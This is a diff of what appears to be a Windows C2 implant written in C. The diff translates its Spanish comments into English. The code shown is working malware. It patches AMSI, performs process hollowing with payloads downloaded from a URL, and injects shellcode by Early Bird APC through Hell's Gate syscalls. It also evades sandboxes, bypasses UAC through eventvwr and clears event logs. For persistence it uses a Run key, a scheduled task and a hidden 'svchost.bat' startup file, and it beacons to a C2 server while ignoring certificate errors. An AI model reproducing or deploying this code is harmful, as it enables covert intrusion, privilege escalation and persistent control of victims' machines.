         DWORD block_size = (ciphertext_len - processed < 16) ? (ciphertext_len - processed) : 16;
         
         printf("[D] CFB Block at %lu (size=%lu):\n", processed, block_size);
@@ -3259,26 +3259,26 @@ BOOL DecryptPacket(BYTE* buffer, DWORD* buffer_len) {
         for (int i = 0; i < (int)block_size; i++) printf("%02x ", keystream[i]);
         printf("\n");
         
-        // XOR ciphertext con keystream
+        // XOR ciphertext with keystream
         for (DWORD i = 0; i < block_size; i++) {
             plaintext[processed + i] = ciphertext[processed + i] ^ keystream[i];
         }
         
-        // Actualizar feedback register para próxima iteración
+        // Update feedback register for next iteration
         if (processed + 16 < ciphertext_len) {
-            // Hay más bloques: feedback = ciphertext actual
+            // More blocks remain: feedback = current ciphertext
             memcpy(feedback_register, &ciphertext[processed], 16);
         }
         
         processed += block_size;
     }
     
-    // Copiar resultado al buffer original
+    // Copy result back to the original buffer
     memcpy(buffer, plaintext, ciphertext_len);
     free(plaintext);
     *buffer_len = ciphertext_len;
     
-    // Output final
+    // Final output
     printf("[D] Plaintext (hex): ");
     for (DWORD i = 0; i < *buffer_len; i++) {
         printf("%02x ", buffer[i]);
@@ -3298,7 +3298,7 @@ char* GetIPs() {
     printf("[*] getips...\n");
     fflush(stdout);
     char* ips = malloc(1024);
-    if (!ips) return NULL; // Verificar malloc
+    if (!ips) return NULL; // Check malloc
     
     ips[0] = '\0';
     PIP_ADAPTER_INFO adapterInfo = NULL;
@@ -3308,7 +3308,7 @@ char* GetIPs() {
     GetAdaptersInfo(adapterInfo, &len);
     adapterInfo = (IP_ADAPTER_INFO*)malloc(len);
     if (!adapterInfo) {
-        free(ips); // Limpiar si falla
+        free(ips); // Clean up if it fails
         return NULL;
     }
     
@@ -3324,7 +3324,7 @@ char* GetIPs() {
     }
     
     free(adapterInfo);
-    return ips; // El que llama debe hacer free(ips)
+    return ips; // Caller must call free(ips)
 }
 
 
@@ -3333,15 +3333,15 @@ char* GetHostname() {
     fflush(stdout);
     
     char* hostname = malloc(256);
-    if (!hostname) return NULL; // Verificar malloc
+    if (!hostname) return NULL; // Check malloc
     
     DWORD size = 256;
     if (!GetComputerNameA(hostname, &size)) {
-        free(hostname); // Limpiar si falla GetComputerNameA
+        free(hostname); // Clean up if GetComputerNameA fails
         return NULL;
     }
     
-    return hostname; // El que llama debe hacer free(hostname)
+    return hostname; // Caller must call free(hostname)
 }
 
 char* GetUsername() {
@@ -3349,15 +3349,15 @@ char* GetUsername() {
     fflush(stdout);
     
     char* username = malloc(256);
-    if (!username) return NULL; // Verificar malloc
+    if (!username) return NULL; // Check malloc
     
     DWORD size = 256;
     if (!GetUserNameA(username, &size)) {
-        free(username); // Limpiar si falla GetUserNameA
+        free(username); // Clean up if GetUserNameA fails
         return NULL;
     }
     
-    return username; // El que llama debe hacer free(username)
+    return username; // Caller must call free(username)
 }
 
 
@@ -3377,7 +3377,7 @@ BOOL patchAMSI(void) {
     return TRUE;
 }
 // ====================================================================
-// PE HELPERS (usando winnt.h)
+// PE HELPERS (using winnt.h)
 // ====================================================================
 PIMAGE_NT_HEADERS get_nt_headers(BYTE* buffer) {
     if (!buffer) return NULL;
@@ -3385,7 +3385,7 @@ PIMAGE_NT_HEADERS get_nt_headers(BYTE* buffer) {
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
         return NULL;
     }
-    return (PIMAGE_NT_HEADERS)(buffer + dos->e_lfanew);  // ← sin *
+    return (PIMAGE_NT_HEADERS)(buffer + dos->e_lfanew);  // no *
 }
 
 BOOL is_64bit(BYTE* buffer) {
@@ -3447,7 +3447,7 @@ ULONGLONG get_remote_image_base(PROCESS_INFORMATION* pi, BOOL is_32bit_target) {
     ULONGLONG peb_addr = 0;
     SIZE_T read = 0;
 
-    // === 1. Intentar con GetThreadContext ===
+    // === 1. Try GetThreadContext ===
 #ifdef _WIN64
     if (is_32bit_target) {
         WOW64_CONTEXT ctx = {0};
@@ -3470,10 +3470,10 @@ ULONGLONG get_remote_image_base(PROCESS_INFORMATION* pi, BOOL is_32bit_target) {
     }
 #endif
 
-    // Validar y leer ImageBase desde PEB
+    // Validate and read ImageBase from PEB
     if (peb_addr != 0) {
         ULONGLONG image_base = 0;
-        ULONGLONG peb_offset = is_32bit_target ? 0x8 : 0x10;  // Offset del ImageBase en el PEB
+        ULONGLONG peb_offset = is_32bit_target ? 0x8 : 0x10;  // ImageBase offset in the PEB
         if (ReadProcessMemory(pi->hProcess, (LPCVOID)(peb_addr + peb_offset), &image_base, sizeof(ULONGLONG), &read)) {
             if (image_base != 0) {
                 printf("[+] Remote image base from PEB (context): 0x%llX\n", image_base);
@@ -3518,8 +3518,8 @@ ULONGLONG get_remote_image_base(PROCESS_INFORMATION* pi, BOOL is_32bit_target) {
         return 0;
     }
 
-    // Leer ImageBaseAddress desde el PEB remoto
-    // Offset: 0x10 en x64, 0x8 en x86
+    // Read ImageBaseAddress from the remote PEB
+    // Offset: 0x10 on x64, 0x8 on x86
     ULONGLONG remote_image_base = 0;
     ULONGLONG peb_image_base_offset = is_32bit_target ? 0x8 : 0x10;
 
@@ -3566,7 +3566,7 @@ BOOL update_remote_entry_point(PROCESS_INFORMATION* pi, ULONGLONG entry_point_va
 // ====================================================================
 void overWrite(const char* targetPath, const char* payloadPath) {
     printf("[*] Starting migration to: %s\n", targetPath);
-   // Verificar si payloadPath es una URL
+   // Check whether payloadPath is a URL
     if (strncmp(payloadPath, "http", 4) == 0) {
         DWORD fileSize = 0;
         unsigned char* downloaded = DownloadToBuffer(payloadPath, &fileSize);
@@ -3575,7 +3575,7 @@ void overWrite(const char* targetPath, const char* payloadPath) {
             return;
         }
         
-        // Guardar temporalmente
+        // Save temporarily
         char tempPath[MAX_PATH];
         GetTempPathA(MAX_PATH, tempPath);
         strcat(tempPath, "temp_payload.exe");
@@ -3586,13 +3586,13 @@ void overWrite(const char* targetPath, const char* payloadPath) {
             fclose(fp);
             free(downloaded);
             
-            // Ahora usar el archivo descargado
+            // Now use the downloaded file
             overWrite(targetPath, tempPath);
             DeleteFileA(tempPath);
             return;
         }
     }
-    // === 1. Cargar payload ===
+    // === 1. Load payload ===
     HANDLE hFile = CreateFileA_Unhooked(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("[-] Cannot open payload: %s\n", payloadPath);
@@ -3621,7 +3621,7 @@ void overWrite(const char* targetPath, const char* payloadPath) {
     }
     printf("[+] Payload mapped: %lu bytes\n", payloadImageSize);
 
-    // === 2. Crear proceso suspendido ===
+    // === 2. Create suspended process ===
     PROCESS_INFORMATION pi = {0};
     if (!create_suspended_process((char*)targetPath, &pi)) {
         VirtualFree(payloadImage, 0, MEM_RELEASE);
@@ -3629,7 +3629,7 @@ void overWrite(const char* targetPath, const char* payloadPath) {
     }
     printf("[+] Suspended process created: PID %lu\n", pi.dwProcessId);
 
-    // === 3. Reservar 2 MB en el proceso remoto ===
+    // === 3. Reserve 2 MB in the remote process ===
     LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, 0x200000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteBuffer) {
         printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
@@ -3641,7 +3641,7 @@ void overWrite(const char* targetPath, const char* payloadPath) {
     }
     printf("[+] Allocated 2 MB in remote process: %p\n", remoteBuffer);
 
-    // === 4. Escribir payload completo ===
+    // === 4. Write full payload ===
     SIZE_T written = 0;
     if (!WriteProcessMemory_Unhooked(pi.hProcess, remoteBuffer, payloadImage, payloadImageSize, &written)) {
         printf("[-] WriteProcessMemory_Unhooked failed: %lu\n", GetLastError());
@@ -3653,7 +3653,7 @@ void overWrite(const char* targetPath, const char* payloadPath) {
     }
     printf("[+] Wrote %zu bytes to remote process\n", written);
 
-    // === 5. Actualizar contexto del hilo para apuntar al nuevo entry point ===
+    // === 5. Update thread context to point to the new entry point ===
     BOOL isPayload64 = is_64bit(payloadImage);
     ULONGLONG entryPointVA = (ULONGLONG)remoteBuffer + get_entry_point_rva(payloadImage);
 
@@ -3670,18 +3670,18 @@ void overWrite(const char* targetPath, const char* payloadPath) {
     CloseHandle(pi.hThread);
     VirtualFree(payloadImage, 0, MEM_RELEASE);
 }
-// Limpia el historial de comandos de la consola actual
+// Clears the current console's command history
 void cleanSystemLogs() {
     printf("[*] Attempting to clean system logs and artifacts...\n");
     fflush(stdout);
-    // 1. Limpiar historial de cmd.exe (doskey)
+    // 1. Clear cmd.exe history (doskey)
     system("doskey /reinstall");
 
-    // 2. Borrar archivos temporales comunes
+    // 2. Delete common temporary files
     system("del /f /q %TEMP%\\beacon_temp_* 2>nul");
     system("del /f /q %TEMP%\\*.tmp 2>nul");
 
-    // 4. Limpiar el historial de comandos de la consola (cmd.exe)
+    // 4. Clear the console (cmd.exe) command history
     HANDLE hConOut = CreateFileA_Unhooked("CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hConOut != INVALID_HANDLE_VALUE) {
         DWORD written;
@@ -3689,8 +3689,8 @@ void cleanSystemLogs() {
         CloseHandle(hConOut);
     }
 
-    // 5. Intentar borrar eventos del registro (requiere SeSecurityPrivilege)
-    // Nota: Esto generalmente requiere privilegios elevados y puede fallar.
+    // 5. Attempt to clear event logs (requires SeSecurityPrivilege)
+    // Note: This usually requires elevated privileges and may fail.
     HANDLE hToken;
     if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
         TOKEN_PRIVILEGES tp = {0};
@@ -3717,7 +3717,7 @@ BOOL ensurePersistence() {
         return FALSE;
     }
 
-    // Método 1: Registro de inicio (HKCU) - Seguro y común
+    // Method 1: Startup registry key (HKCU) - Safe and common
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -3732,7 +3732,7 @@ BOOL ensurePersistence() {
         RegCloseKey(hKey);
     }
 
-    // Método 2: Tarea programada como usuario actual (sin SYSTEM)
+    // Method 2: Scheduled task as current user (without SYSTEM)
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
         "schtasks /create /tn \"SystemMaintenanceTask\" /tr \"%s\" /sc onlogon /rl HIGHEST /f >nul 2>&1",
@@ -3745,19 +3745,19 @@ BOOL ensurePersistence() {
         printf("[-] Scheduled task creation failed (likely no permissions)\n");
     }
 
-    // Método 3: Archivo oculto en Startup con nombre legítimo
+    // Method 3: Hidden file in Startup with a legitimate name
     char startupPath[MAX_PATH];
     ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat",
                              startupPath, sizeof(startupPath));
 
     FILE* f = fopen(startupPath, "w");
     if (f) {
-        // Usa atributos ocultos y ejecución silenciosa
+        // Uses hidden attributes and silent execution
         fprintf(f, "@echo off\nif not exist \"%s\" exit\n", executable);
         fprintf(f, "start \"\" /min \"%s\" >nul 2>&1\n", executable);
         fclose(f);
 
-        // Hacer archivo oculto
+        // Make the file hidden
         SetFileAttributesA(startupPath, FILE_ATTRIBUTE_HIDDEN);
         printf("[+] Added hidden batch to startup folder\n");
     } else {
@@ -3772,14 +3772,14 @@ BOOL ensurePersistence() {
 BOOL isSandboxEnvironment() {
     printf("[*] issandobox...\n");
     fflush(stdout);
-    // 1. Número de CPUs
+    // 1. Number of CPUs
     SYSTEM_INFO sysInfo;
     GetSystemInfo(&sysInfo);
     if (sysInfo.dwNumberOfProcessors <= 1) {
         return TRUE;
     }
 
-    // 2. Memoria RAM < 6 GB
+    // 2. RAM < 6 GB
     MEMORYSTATUSEX memInfo;
     memInfo.dwLength = sizeof(memInfo);
     if (GlobalMemoryStatusEx(&memInfo)) {
@@ -3788,7 +3788,7 @@ BOOL isSandboxEnvironment() {
         }
     }
 
-    // 3. MAC Address de VM
+    // 3. VM MAC address
     PIP_ADAPTER_INFO adapterInfo = NULL;
     PIP_ADAPTER_INFO adapter = NULL;
     ULONG len = 0;
@@ -3814,7 +3814,7 @@ BOOL isSandboxEnvironment() {
     }
     if (adapterInfo) free(adapterInfo);
 
-    // 4. Dispositivos de disco virtual
+    // 4. Virtual disk devices
     if (GetDriveTypeA("C:\\") == DRIVE_FIXED) {
         HANDLE h = CreateFileA_Unhooked("\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
         if (h != INVALID_HANDLE_VALUE) {
@@ -3847,19 +3847,19 @@ void tryPrivilegeEscalation() {
 BOOL executeUACBypass(const char* payloadPath) {
     printf("[*] Attempting UAC bypass via eventvwr.exe...\n");
     fflush(stdout);
-    // Ruta del payload
+    // Payload path
     char fullPayloadPath[MAX_PATH];
     if (!GetFullPathNameA(payloadPath, MAX_PATH, fullPayloadPath, NULL)) {
         printf("[-] Failed to get full path of payload.\n");
         return FALSE;
     }
 
-    // Claves del registro
+    // Registry keys
     const char* regKey = "Environment";
     const char* regValue = "windir";
     const char* maliciousCmd = "\\??\\C:\\Windows\\System32\\cmd.exe /k %windir%";
 
-    // Escribir en HKCU\Environment\windir
+    // Write to HKCU\Environment\windir
     HKEY hKey;
     if (RegOpenKeyA(HKEY_CURRENT_USER, regKey, &hKey) != ERROR_SUCCESS) {
         printf("[-] Failed to open HKCU\\Environment.\n");
@@ -3873,7 +3873,7 @@ BOOL executeUACBypass(const char* payloadPath) {
     }
     RegCloseKey(hKey);
 
-    // Ejecutar eventvwr.exe (se auto-eleva si el usuario es admin)
+    // Run eventvwr.exe (auto-elevates if the user is admin)
     SHELLEXECUTEINFOA sei = {0};
     sei.cbSize = sizeof(sei);
     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -3886,10 +3886,10 @@ BOOL executeUACBypass(const char* payloadPath) {
         return FALSE;
     }
 
-    // Esperar un poco
+    // Wait a bit
     Sleep(2000);
 
-    // Limpiar
+    // Clean up
     RegOpenKeyA(HKEY_CURRENT_USER, regKey, &hKey);
     RegDeleteValueA(hKey, regValue);
     RegCloseKey(hKey);
@@ -3956,7 +3956,7 @@ void PortScanner(char* targetIP, int* ports, int numPorts) {
     PortResult results[64];
     int threadCount = 0;
     
-    // Limpiar resultados anteriores
+    // Clear previous results
     if (portScanResults) {
         free(portScanResults);
     }
@@ -3964,7 +3964,7 @@ void PortScanner(char* targetIP, int* ports, int numPorts) {
     if (!portScanResults) return;
     portScanResults[0] = '\0';
     
-    // Crear threads para cada puerto
+    // Create a thread for each port
     for (int i = 0; i < numPorts && i < 64; i++) {
         strcpy(results[threadCount].ip, targetIP);
         results[threadCount].port = ports[i];
@@ -3976,10 +3976,10 @@ void PortScanner(char* targetIP, int* ports, int numPorts) {
         }
     }
     
-    // Esperar a que todos los threads terminen
+    // Wait for all threads to finish
     WaitForMultipleObjects(threadCount, hThreads, TRUE, 5000);
     
-    // Recopilar resultados
+    // Collect results
     for (int i = 0; i < threadCount; i++) {
         if (results[i].open) {
             char temp[64];
@@ -3996,16 +3996,16 @@ void PortScanner(char* targetIP, int* ports, int numPorts) {
 void PortScannerWrapper(void* arg) {
     PortScannerArgs* args = (PortScannerArgs*)arg;
     
-    // Hacer copia local porque el argumento puede desaparecer
+    // Make a local copy because the argument may disappear
     char ip[32];
     int ports[64];
     int numPorts = args->numPorts;
     strcpy(ip, args->targetIP);
     memcpy(ports, args->ports, numPorts * sizeof(int));
     
-    free(args); // fue malloc'ed antes de _beginthread
+    free(args); // it was malloc'ed before _beginthread
 
-    // Ahora llamar a la función real
+    // Now call the real function
     PortScanner(ip, ports, numPorts);
 }
 
@@ -4015,10 +4015,10 @@ void PortScannerWrapper(void* arg) {
 
 
 
-// === INYECCIÓN EARLY BIRD + SYSCALL ===
+// === EARLY BIRD INJECTION + SYSCALL ===
 BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     if (anti_analysis()) {
-        printf("[-] Entorno de análisis detectado. Saliendo.\n");
+        printf("[-] Analysis environment detected. Exiting.\n");
         fflush(stdout);
         return FALSE;
     }
@@ -4026,7 +4026,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(STARTUPINFOA);
 
-    printf("[*] Intentando crear proceso: %s\n", OBF_TARGET_PROCESS);
+    printf("[*] Trying to create process: %s\n", OBF_TARGET_PROCESS);
     fflush(stdout);
 
     if (!CreateProcessA(
@@ -4042,13 +4042,13 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
         &pi
     )) {
         DWORD err = GetLastError();
-        printf("[-] CreateProcessA falló para %s: %lu\n", OBF_TARGET_PROCESS, err);
+        printf("[-] CreateProcessA failed for %s: %lu\n", OBF_TARGET_PROCESS, err);
         fflush(stdout);
 
         return FALSE;
     }
 
-    printf("[+] Proceso suspendido creado: PID=%lu\n", pi.dwProcessId);
+    printf("[+] Suspended process created: PID=%lu\n", pi.dwProcessId);
     fflush(stdout);
 
     HANDLE hProcess = pi.hProcess;
@@ -4056,7 +4056,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
 
     HMODULE ntdll = GetNtdllBase();
     if (!ntdll) {
-        printf("[-] No se pudo obtener ntdll.dll\n");
+        printf("[-] Could not get ntdll.dll\n");
         fflush(stdout);
 
         TerminateProcess(pi.hProcess, 1);
@@ -4071,7 +4071,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     PVOID pNtResumeThread         = GetProcAddress(ntdll, "NtResumeThread");
 
     if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtQueueApcThread || !pNtResumeThread) {
-        printf("[-] No se pudieron obtener funciones de ntdll\n");
+        printf("[-] Could not get ntdll functions\n");
         fflush(stdout);
 
         TerminateProcess(pi.hProcess, 1);
@@ -4086,7 +4086,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     DWORD ssn_resume = GetSyscallNumber(pNtResumeThread);
 
     if (!ssn_alloc || !ssn_write || !ssn_apc || !ssn_resume) {
-        printf("[-] No se pudo obtener SSN de alguna función\n");
+        printf("[-] Could not get SSN for some function\n");
         fflush(stdout);
 
         TerminateProcess(pi.hProcess, 1);
@@ -4109,7 +4109,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
         PAGE_READWRITE
     );
     if (status != STATUS_SUCCESS) {
-        printf("[-] NtAllocateVirtualMemory falló: 0x%08lX\n", (unsigned long)status);
+        printf("[-] NtAllocateVirtualMemory failed: 0x%08lX\n", (unsigned long)status);
         fflush(stdout);
 
         TerminateProcess(pi.hProcess, 1);
@@ -4117,12 +4117,12 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
         CloseHandle(pi.hProcess);
         return FALSE;
     }
-    printf("[+] Memoria remota asignada: 0x%p\n", pRemoteMem);
+    printf("[+] Remote memory allocated: 0x%p\n", pRemoteMem);
     fflush(stdout);
     Sleep(GetJitteredSleep(SLEEP_BASE));
     // WriteProcessMemory_Unhooked
     if (!WriteProcessMemory_Unhooked(hProcess, pRemoteMem, shellcode, shellcode_len, NULL)) {
-        printf("[-] WriteProcessMemory_Unhooked falló: %lu\n", GetLastError());
+        printf("[-] WriteProcessMemory_Unhooked failed: %lu\n", GetLastError());
         fflush(stdout);
 
         TerminateProcess(pi.hProcess, 1);
@@ -4131,7 +4131,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
         return FALSE;
     }
 
-    printf("[+] Shellcode escrito en proceso remoto.\n");
+    printf("[+] Shellcode written to remote process.\n");
     fflush(stdout);
 
     
@@ -4146,7 +4146,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
             &oldProtect
         );
         if (!NT_SUCCESS(status)) {
-            printf("[-] NtProtectVirtualMemory unhooked falló: 0x%08X\n", status);
+            printf("[-] NtProtectVirtualMemory unhooked failed: 0x%08X\n", status);
             fflush(stdout);
             CloseHandle(pi.hThread);
             CloseHandle(pi.hProcess);
@@ -4155,14 +4155,14 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     } else {
         // Fallback
         if (!VirtualProtectEx(hProcess, pRemoteMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
-            printf("[-] VirtualProtectEx falló: %lu\n", GetLastError());
+            printf("[-] VirtualProtectEx failed: %lu\n", GetLastError());
             fflush(stdout);
             CloseHandle(pi.hThread);
             CloseHandle(pi.hProcess);
             return FALSE;
         }
     }
-    printf("[+] Protección cambiada a PAGE_EXECUTE_READ.\n");
+    printf("[+] Protection changed to PAGE_EXECUTE_READ.\n");
     fflush(stdout);
 
     // NtQueueApcThread (syscall)
@@ -4173,7 +4173,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
         0, 0, 0, 0
     );
     if (status != STATUS_SUCCESS) {
-        printf("[-] NtQueueApcThread falló: 0x%08lX\n", (unsigned long)status);
+        printf("[-] NtQueueApcThread failed: 0x%08lX\n", (unsigned long)status);
         fflush(stdout);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
@@ -4182,19 +4182,19 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     printf("[+] APC enqueued via NtQueueApcThread.\n");
     fflush(stdout);
 
-    // 🔹 NtResumeThread unhooked
+    // NtResumeThread unhooked
     DWORD suspendCount;
     if (g_pNtResumeThreadUnhooked) {
         status = g_pNtResumeThreadUnhooked(hThread, &suspendCount);
         if (!NT_SUCCESS(status)) {
-            printf("[-] NtResumeThread unhooked falló: 0x%08X\n", status);
+            printf("[-] NtResumeThread unhooked failed: 0x%08X\n", status);
             fflush(stdout);
             CloseHandle(pi.hThread);
             CloseHandle(pi.hProcess);
             return FALSE;
         }
     } else {
-        // Fallback a Hell's Gate si el stub no está disponible
+        // Fall back to Hell's Gate if the stub is not available
         HellsGate(ssn_resume);
         status = HellDescent(
             (DWORD64)hThread,
@@ -4202,7 +4202,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
             0, 0, 0, 0
         );
         if (!NT_SUCCESS(status)) {
-            printf("[-] NtResumeThread (Hell's Gate) falló: 0x%08X\n", status);
+            printf("[-] NtResumeThread (Hell's Gate) failed: 0x%08X\n", status);
             fflush(stdout);
             CloseHandle(pi.hThread);
             CloseHandle(pi.hProcess);
@@ -4210,13 +4210,13 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
         }
     }
     if (status != STATUS_SUCCESS) {
-        printf("[-] NtResumeThread falló: 0x%08lX\n", (unsigned long)status);
+        printf("[-] NtResumeThread failed: 0x%08lX\n", (unsigned long)status);
         fflush(stdout);
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         return FALSE;
     }
-    printf("[+] Hilo reanudado. Payload en ejecución.\n");
+    printf("[+] Thread resumed. Payload running.\n");
     fflush(stdout);
 
     CloseHandle(hThread);
@@ -4231,7 +4231,7 @@ PacketEncryptionContext* init_aes_context(const char* key_hex) {
     PacketEncryptionContext* ctx = (PacketEncryptionContext*)malloc(sizeof(PacketEncryptionContext));
     if (!ctx) return NULL;
 
-    // Convertir hex a bytes
+    // Convert hex to bytes
     for (int i = 0; i < 64; i += 2) {
         char byte_str[3] = { key_hex[i], key_hex[i+1], '\0' };
         ctx->Key[i/2] = (uint8_t)strtol(byte_str, NULL, 16);
@@ -4246,14 +4246,14 @@ PacketEncryptionContext* init_aes_context(const char* key_hex) {
 char* retry_http_request(const char* url, const char* method, const char* data, int max_retries) {
     printf("[*] retry_http_request...\n");
     fflush(stdout);
-    printf("[*] Enviando %s a: %s\n", method, url);
+    printf("[*] Sending %s to: %s\n", method, url);
     if (data) {
-        printf("[*] Datos a enviar (encriptados): %s\n", data);
+        printf("[*] Data to send (encrypted): %s\n", data);
     }
     fflush(stdout);
     
     for (int attempt = 0; attempt < max_retries; attempt++) {
-        printf("[*] Intento %d/%d\n", attempt + 1, max_retries);
+        printf("[*] Attempt %d/%d\n", attempt + 1, max_retries);
         fflush(stdout);
         
         HINTERNET hSession = WinHttpOpen(USER_AGENT,
@@ -4262,13 +4262,13 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
             WINHTTP_NO_PROXY_BYPASS,
             0);
         if (!hSession) {
-            printf("[-] Error creando sesión WinHTTP\n");
+            printf("[-] Error creating WinHTTP session\n");
             fflush(stdout);
             Sleep(1000);
             continue;
         }
 
-        // Parse URL - mejorado para manejar https/http
+        // Parse URL - improved to handle https/http
         char host[256], path[512];
         int port = 443; // Default HTTPS
         const char* host_start = url;
@@ -4285,7 +4285,7 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
         const char* port_start = strchr(host_start, ':');
         
         if (port_start && (!path_start || port_start < path_start)) {
-            // Hay puerto especificado
+            // Port is specified
             int host_len = port_start - host_start;
             strncpy(host, host_start, host_len);
             host[host_len] = '\0';
@@ -4305,12 +4305,12 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
             strcpy(path, "/");
         }
 
-        printf("[D] Host: %s, Puerto: %d, Path: %s\n", host, port, path);
+        printf("[D] Host: %s, Port: %d, Path: %s\n", host, port, path);
         fflush(stdout);
 
         HINTERNET hConnect = WinHttpConnect(hSession, UTF8ToWide(host), port, 0);
         if (!hConnect) {
-            printf("[-] Error conectando a %s:%d\n", host, port);
+            printf("[-] Error connecting to %s:%d\n", host, port);
             fflush(stdout);
             WinHttpCloseHandle(hSession);
             Sleep(1000);
@@ -4331,7 +4331,7 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
             request_flags);
 
         if (!hRequest) {
-            printf("[-] Error creando request\n");
+            printf("[-] Error creating request\n");
             fflush(stdout);
             WinHttpCloseHandle(hConnect);
             WinHttpCloseHandle(hSession);
@@ -4339,7 +4339,7 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
             continue;
         }
 
-        // Configurar flags de seguridad para HTTPS
+        // Configure security flags for HTTPS
         if (request_flags & WINHTTP_FLAG_SECURE) {
             DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
@@ -4347,12 +4347,12 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
                           SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
             if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
-                printf("[-] Error configurando flags SSL\n");
+                printf("[-] Error setting SSL flags\n");
                 fflush(stdout);
             }
         }
 
-        // Añadir headers
+        // Add headers
         BOOL headers_ok = TRUE;
         if (data && strlen(data) > 0) {
             if (!WinHttpAddRequestHeaders(hRequest,
@@ -4364,7 +4364,7 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
                 fflush(stdout);
                 headers_ok = FALSE;
             }
-            printf("[D] Primeros 20 bytes del cuerpo: %.*s\n", 
+            printf("[D] First 20 bytes of body: %.*s\n", 
                    (int)(strlen(data) > 20 ? 20 : strlen(data)), data);
             fflush(stdout);
         }
@@ -4377,7 +4377,7 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
             continue;
         }
 
-        // Enviar solicitud
+        // Send request
         DWORD data_length = data ? strlen(data) : 0;
         BOOL sent = WinHttpSendRequest(hRequest,
             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
@@ -4386,31 +4386,31 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
 
         if (!sent) {
             DWORD error = GetLastError();
-            printf("[-] WinHttpSendRequest falló, Código: %lu\n", error);
+            printf("[-] WinHttpSendRequest failed, Code: %lu\n", error);
             switch(error) {
                 case ERROR_WINHTTP_SECURE_FAILURE:       
-                    printf("   -> Fallo SSL\n"); 
+                    printf("   -> SSL failure\n"); 
                     break;
                 case ERROR_NOT_ENOUGH_MEMORY:            
-                    printf("   -> Memoria insuficiente\n"); 
+                    printf("   -> Insufficient memory\n"); 
                     break;
                 case ERROR_INVALID_PARAMETER:            
-                    printf("   -> Parámetro inválido\n"); 
+                    printf("   -> Invalid parameter\n"); 
                     break;
                 case ERROR_WINHTTP_CANNOT_CONNECT:
-                    printf("   -> No se puede conectar al servidor\n");
+                    printf("   -> Cannot connect to server\n");
                     break;
                 case ERROR_WINHTTP_TIMEOUT:
-                    printf("   -> Timeout de conexión\n");
+                    printf("   -> Connection timeout\n");
                     break;
                 case ERROR_WINHTTP_NAME_NOT_RESOLVED:
-                    printf("   -> No se pudo resolver el nombre del host\n");
+                    printf("   -> Could not resolve host name\n");
                     break;
                 case 12030: // ERROR_INTERNET_CONNECTION_ABORTED
-                    printf("   -> Conexión abortada\n");
+                    printf("   -> Connection aborted\n");
                     break;
                 default: 
-                    printf("   -> Error desconocido: %lu\n", error);
+                    printf("   -> Unknown error: %lu\n", error);
             }
             fflush(stdout);
             WinHttpCloseHandle(hRequest);
@@ -4431,17 +4431,17 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
             continue;
         }
 
-        // Obtener código de estado HTTP
+        // Get HTTP status code
         DWORD statusCode = 0;
         DWORD statusCodeSize = sizeof(statusCode);
         if (WinHttpQueryHeaders(hRequest,
             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
             NULL, &statusCode, &statusCodeSize, NULL)) {
-            printf("[+] Código de estado HTTP: %lu\n", statusCode);
+            printf("[+] HTTP status code: %lu\n", statusCode);
             fflush(stdout);
         }
 
-        // Leer respuesta
+        // Read response
         char* response = NULL;
         DWORD totalSize = 0;
         DWORD bytesRead;
@@ -4449,7 +4449,7 @@ char* retry_http_request(const char* url, const char* method, const char* data, 
 
         do {
